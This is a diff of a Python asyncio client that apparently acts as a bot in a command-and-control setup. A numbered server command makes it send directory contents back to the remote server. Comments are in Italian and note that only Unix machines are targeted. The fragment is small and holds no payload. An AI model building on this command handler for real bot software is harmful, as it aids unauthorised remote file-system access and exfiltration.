@@ -81,14 +81,7 @@ async def run_client(hostname: str, port: int) -> None:
 
         elif response.decode().startswith(__response_options["9"]):
             request = re.split(__response_options["9"], response.decode())[1]
-            await bot_utils.send_dir_content(request, os_type, writer)
-            # writer.write(operation_keyword.encode())
+            await bot_utils.send_dir_content(request, writer)
+            writer.write(operation_keyword.encode())
         else:  # In caso contrario chiediamo al server di inviare una nuova risposta valida
             writer.write(operation_keyword.encode())
-
-
-# TODO: Disable -> Dobbiamo gestire solo macchine Unix
-def set_initializer():
-    """Setter e wrapper della funzione di recupero OS."""
-    global os_type
-    os_type = bot_utils.os_type_initializer()
